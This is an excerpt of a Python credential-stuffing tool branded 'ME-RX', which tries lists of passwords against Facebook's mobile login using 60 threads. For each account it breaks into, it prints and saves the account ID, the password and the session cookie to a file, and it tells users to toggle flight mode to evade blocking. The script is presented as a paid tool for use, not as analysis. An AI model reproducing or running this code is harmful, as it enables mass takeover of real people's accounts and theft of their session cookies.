...
header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ASU2JS; ms-office);]"}
...
\x1b[1;92m════════════\x1b[1;96mTAMAK-PATA🍁\x1b[1;92m═════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: PRINCE RONI/RABBY HASSAN
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;96mME-RX
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;92mACTIVE
\x1b[1;36m{+} \x1b[1;91mTOOL VIRSION      \x1b[1;97m: \x1b[1;92m0.0.1
\033[1;96m═════════════════════════════════════════════
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/itrabbyhassan');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801309140665');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/ME-RX');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('\033[1;97m┗━[•] \033[1;92mUSE FLIGHT MODE FOR BEST RESULTS ... ')
		print(50*'━')
		for guru in user:
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mME-RX-👿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            "pass":ps,
            "login":"Log In"}
            header_freefb = headers = {'authority': 'p.facebook.com',
            'method': 'GET',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [ME-RX-OK🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/ME-RX-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/ME-RX/ME-RX/blob/main/Approved.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://facebook.com/itznobitaz")
        time.sleep(3.0)
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am B.D.H.A ROBOT and my boss is Rabbi Hassan.Sir this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://wa.me/+8801309140665")
        superuser()        
superuser()